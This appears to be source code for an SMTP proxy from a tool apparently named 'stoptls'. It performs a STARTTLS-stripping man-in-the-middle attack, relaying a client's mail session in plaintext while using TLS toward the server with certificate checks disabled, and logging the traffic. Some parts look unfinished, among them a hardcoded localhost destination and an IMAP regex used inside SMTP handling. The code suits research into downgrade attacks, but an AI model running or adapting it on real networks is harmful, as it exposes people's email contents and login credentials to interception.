import asyncio
import logging
import socket
import ssl

from stoptls.tcp.base import TCPProxy
from stoptls.tcp import regex

logging.getLogger().setLevel(logging.DEBUG)

class SMTPProxy(TCPProxy):
    def __init__(self):
        super().__init__()

    async def strip(self, client_reader, client_writer):
        dst_address, dst_port = self.get_orig_dst_socket(client_writer)
        dst_address, dst_port = '127.0.0.1', 25
        logging.debug('Original destination: {}:{}'.format(dst_address,
                                                           dst_port))
        server_reader, server_writer = await asyncio.open_connection(dst_address,
                                                                     dst_port)
        banner = await server_reader.readline()
        logging.debug('Received banner: {}'.format(banner))

        client_writer.write(banner)
        logging.debug('Writing banner to client...')
        await client_writer.drain()

        # Premptively issue an EHLO command.
        # If STARTTLS is supported, we upgrade connection
        client_address, client_port = client_writer.get_extra_info('peername')

        try:
            client_hostname = (await asyncio.get_running_loop()
                               .getnameinfo((client_address,
                                             client_port)))
        except socket.gaierror:
            client_hostname = client_address

        server_writer.write('EHLO {}\r\n'.format(client_hostname).encode('ascii'))
        await server_writer.drain()

        # Process EHLO response.
        # TODO: Move this logic into a method
        ehlo_response = await server_reader.readline()
        ehlo_response_re = regex.SMTP_RESPONSE.fullmatch(ehlo_response.decode('ascii'))
        tls_supported = False
        while (not server_reader.at_eof() and
               ehlo_response_re and
               ehlo_response_re.group('line_cont')):
            if ehlo_response_re.group('message') and \
               ehlo_response_re.group('message').upper() == 'STARTTLS':
                tls_supported = True

            ehlo_response = await server_reader.readline()
            ehlo_response_re = regex.SMTP_RESPONSE.fullmatch(ehlo_response.decode('ascii'))

        if tls_supported:
            server_writer.write('STARTTLS\n'.encode('ascii'))
            await server_writer.drain()

            tls_started = await server_reader.readline()
            tls_started_re = regex.SMTP_RESPONSE.fullmatch(tls_started.decode('ascii'))

            if tls_started_re and \
               tls_started_re.group('status_code') == '220':
                sc = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
                sc.check_hostname = False
                sc.verify_mode = ssl.CERT_NONE

                nameinfo = await asyncio.get_running_loop()\
                                        .getnameinfo((dst_address,
                                                      dst_port),
                                                     socket.NI_NAMEREQD)
                server_reader, server_writer = await asyncio.open_connection(sock=server_writer.get_extra_info('socket'),
                                                                             ssl=sc,
                                                                             server_hostname=nameinfo[0])
                logging.debug('Sucessfully upgraded to TLS!')
            else:
                logging.debug('Failed to upgraded to TLS')
            
        while not server_reader.at_eof():
            client_data = await client_reader.readline()
            logging.debug('Received client data: {}'.format(client_data))

            client_data_re = regex.SMTP_COMMAND.fullmatch(client_data.decode('ascii'))
            if client_reader.at_eof():
                logging.debug('Client closed connection')
                break

            try:
                server_writer.write(client_data)
                logging.debug('Writing client data to server...')
                await server_writer.drain()
            except ConnectionResetError:
                break

            logging.debug('Reading line from server...')

            server_data = await server_reader.readline()

            logging.debug('Received server data: {}'.format(server_data))
            client_writer.write(server_data)
            logging.debug('Writing server data to client...')
            await client_writer.drain()

            server_data_re = regex.IMAP_RESPONSE.fullmatch(server_data.decode('ascii'))

            if client_data_re:
                if client_data_re.group('cmd').upper() == 'EHLO':
                    # handle EHLO
                    server_data_re = regex.SMTP_RESPONSE.fullmatch(server_data.decode('ascii'))
                    while (not server_reader.at_eof() and
                           server_data_re and
                           server_data_re.group('line_cont')):
                        server_data = await server_reader.readline()
                        server_data_re = regex.SMTP_RESPONSE.fullmatch(server_data.decode('ascii'))
                        logging.debug('Received server data: {}'.format(server_data))
                        client_writer.write(server_data)
                        logging.debug('Writing server data to client...')
                        await client_writer.drain()
                elif (client_data_re.group('cmd').upper() == 'DATA' and
                      server_data_re and
                      server_data_re.group('status_code') == '354'):
                    client_data = await client_reader.readline()
                    server_writer.write(client_data)
                    await server_writer.drain()
                    while client_data != b'.\r\n':
                        client_data = await client_reader.readline()
                        server_writer.write(client_data)
                        await server_writer.drain()

                    logging.debug('Reading line from server...')
                    server_data = await server_reader.readline()

                    if server_reader.at_eof():
                        logging.debug('Server closed connection')
                        break

                    logging.debug('Received server data: {}'.format(server_data))
                    client_writer.write(server_data)
                    logging.debug('Writing server data to client...')
                    await client_writer.drain()

        server_writer.close()
        client_writer.close()
        logging.debug('Connections closed')
